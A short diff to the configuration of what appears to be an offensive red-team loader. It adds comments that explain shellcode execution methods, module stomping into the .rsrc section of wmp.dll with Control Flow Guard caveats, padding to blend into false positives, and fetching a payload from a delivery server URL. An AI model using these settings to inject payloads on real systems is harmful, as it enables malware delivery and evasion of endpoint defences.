@@ -53,10 +53,10 @@ encode_encrypt_url='/login/'
 use_pyramid_for_delivery=True
 is_shellcode_payload=True  # True: shellcode - False: PE
 FP_bytes=False # optional - if bytes are set requires using PE payload - set number of padding bytes to be added after the PE or shellcode to blend into False Positives (FPs)
-execmethod='funcpointer'
-payload_name = 'payload.bin'
-hosting_dll_path="C:\\Windows\\System32\wmp.dll"
-tgtsection=".rsrc"
+execmethod='funcpointer'  # valid execution methods are: createthread, enumdesktopsw, funcpointer
+payload_name = 'payload.bin'  # file to be fetched from Server/Delivery_files folder
+hosting_dll_path="C:\\Windows\\System32\wmp.dll"  # dll to inject onto - beware of Control Flow Guard, choose tgtsection and shellcode accordingly.
+tgtsection=".rsrc" # target section to be overwritten with the payload
 URI_payload_delivery='http://192.168.1.1/payload.bin' # only needed if use_pyramid_for_delivery is false
 dll_procedure='StartW' # Only necessary if payload is PE - dll procedure name to be called for dll execution
 
